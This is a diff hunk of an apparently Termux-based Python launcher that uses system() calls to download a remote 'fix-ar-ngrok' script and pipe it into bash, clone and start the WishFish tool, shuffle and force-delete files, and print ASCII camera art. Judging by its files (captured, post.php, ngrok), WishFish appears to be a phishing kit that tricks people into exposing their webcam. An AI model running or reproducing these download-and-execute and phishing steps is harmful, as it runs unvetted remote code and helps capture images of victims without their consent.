@@ -289,51 +289,27 @@ system('pkg install wget -y')
 #system('rm -rf 01010cam saved.ip.txt README.md extract.sh fix-ar-ngrok ip.php index2.html index.php ip.php template.php LICENSE template.php saycheese.html ngrok jmaxopcam.sh post.php ~/01010cam/')
 
 system('rm -rf  saved.ip.txt getid Custom.html LICENSE README.md captured copy.sh index.php index2.html ip.php post.php ngrok template.php wishfish.html wishfish.sh ~/WishFish/')
-
 system('wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok && bash fix-ar-ngrok')
-
 system('mv fix-ar-ngrok ~')
-
 system('clear')
-
 system('cls')
-
 system('clear')
-
 system('git clone https://github.com/kinghacker0/WishFish.git')
-
 system('clear')
-
 print('''\033[1;32m        .---.''')
-
 print('''\033[1;32m        |[\033[1;31mX\033[1;32m]|''')
-
 print('''\033[1;32m _.==._.""""".___n__''')
-
 print('''\033[1;32md __ ___.-""-. _____b''')
-
 print('''\033[1;32m|[__]  /.""".\\\ _   |''')
-
 print('''\033[1;32m|     // /""\ \\\_)  |''')
-
 print('''\033[1;32m|     \\\ \__/ //    |''')
-
 print('''\033[1;32m|      \`.__.`/     |''')
-
 print('''\033[1;32m\=======`-..-`======/''')
-
 print('''\033[1;32m `-----------------` ''')
-
 input (Y + "Pleace Enter to OpEn...")
-
 system('cp $PREFIX/bin/ngrok ~/Dark.soul/WishFish')
-
 system('mv ~/Dark.soul/WishFish ~')
-
 system('mv ~/WishFish/Custom.html ~/WishFish/LICENSE ~/WishFish/README.md ~/WishFish/captured ~/WishFish/copy.sh ~/WishFish/index.php ~/WishFish/index2.html ~/WishFish/ip.php ~/WishFish/post.php ~/WishFish/ngrok ~/WishFish/template.php ~/WishFish/wishfish.html ~/WishFish/wishfish.sh ~/Dark.soul/')
-
 system('rm -rf ~/WishFish')
-
 system('bash wishfish.sh')
-
 exit()
